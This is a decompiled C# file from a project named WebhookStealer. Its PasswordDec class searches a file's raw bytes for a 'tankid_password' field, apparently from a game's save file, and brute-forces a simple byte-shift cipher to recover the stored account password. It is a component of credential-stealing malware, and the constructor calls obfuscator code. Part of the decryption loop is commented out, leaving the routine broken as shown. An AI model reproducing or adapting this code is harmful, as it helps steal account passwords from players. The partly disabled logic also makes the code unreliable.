using System;
using System.Collections.Generic;
using System.Text;

namespace WebhookStealer
{
	// Token: 0x02000004 RID: 4
	public class PasswordDec
	{
		// Token: 0x06000010 RID: 16 RVA: 0x00004450 File Offset: 0x00002650
		public List<string> PPW(byte[] contents)
		{
			List<string> result;
			try
			{
				string text = "";
				foreach (byte b in contents)
				{
					string text2 = b.ToString("X2");
					if (text2 == "00")
					{
						text += "<>";
					}
					else
					{
						text += text2;
					}
				}
				if (text.Contains("74616E6B69645F70617373776F7264"))
				{
					string text3 = "74616E6B69645F70617373776F7264";
					int num = text.IndexOf(text3);
					int num2 = text.LastIndexOf(text3);
					num += text3.Length;
					int num3 = text.IndexOf("<><><>", num);
					string text4;
					if (((Encoding.UTF8.GetString(this.StringToByteArray(text.Substring(num, num3 - num).Trim())).ToCharArray()[0] == '_') ? 1 : 0) == 0)
					{
						text4 = text.Substring(num, num3 - num).Trim();
					}
					else
					{
						num2 += text3.Length;
						num3 = text.IndexOf("<><><>", num2);
						text4 = text.Substring(num2, num3 - num2).Trim();
					}
					string text5 = "74616E6B69645F70617373776F7264" + text4 + "<><><>";
					int num4 = text.IndexOf(text5);
					num4 += text5.Length;
					int num5 = text.IndexOf("<><><>", num4);
					string text6 = text.Substring(num4, num5 - num4).Trim();
					int num6 = (int)this.StringToByteArray(text4)[0];
					text6 = text6.Substring(0, num6 * 2);
					byte[] array = this.StringToByteArray(text6.Replace("<>", "00"));
					List<byte> list = new List<byte>();
					List<byte> list2 = new List<byte>();
/*					byte b2 = 48 - array[0];*/
					foreach (byte b3 in array)
/*					{
						list.Add(b2 + b3);
					}*/
					for (int k = 0; k < list.Count; k++)
					{
						list2.Add((byte)((int)(list[k] - 1) - k));
					}
					List<string> list3 = new List<string>();
					for (int l = 0; l <= 255; l++)
					{
						string text7 = "";
						foreach (byte b4 in list2)
						{
							if (this.method_0((char)((byte)((int)b4 + l))))
							{
								text7 += ((char)((byte)((int)b4 + l))).ToString();
							}
						}
						if (text7.Length == num6)
						{
							list3.Add(text7);
						}
					}
					result = list3;
				}
				else
				{
					result = null;
				}
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x06000011 RID: 17 RVA: 0x00004740 File Offset: 0x00002940
		public byte[] StringToByteArray(string str)
		{
			Dictionary<string, byte> dictionary = new Dictionary<string, byte>();
			for (int i = 0; i <= 255; i++)
			{
				dictionary.Add(i.ToString("X2"), (byte)i);
			}
			List<byte> list = new List<byte>();
			for (int j = 0; j < str.Length; j += 2)
			{
				list.Add(dictionary[str.Substring(j, 2)]);
			}
			return list.ToArray();
		}

		// Token: 0x06000012 RID: 18 RVA: 0x000022C1 File Offset: 0x000004C1
		private bool method_0(char char_0)
		{
			return (char_0 >= '0' && char_0 <= '9') || (char_0 >= 'A' && char_0 <= 'Z') || (char_0 >= 'a' && char_0 <= 'z') || (char_0 >= '+' && char_0 <= '.');
		}

		// Token: 0x06000013 RID: 19 RVA: 0x000047A8 File Offset: 0x000029A8
		public string[] Func(byte[] lel)
		{
			return this.PPW(lel).ToArray();
		}

		// Token: 0x06000014 RID: 20 RVA: 0x000022EE File Offset: 0x000004EE
		public PasswordDec()
		{
			Class3.QU7D36NzQAHi4();
		}
	}
}
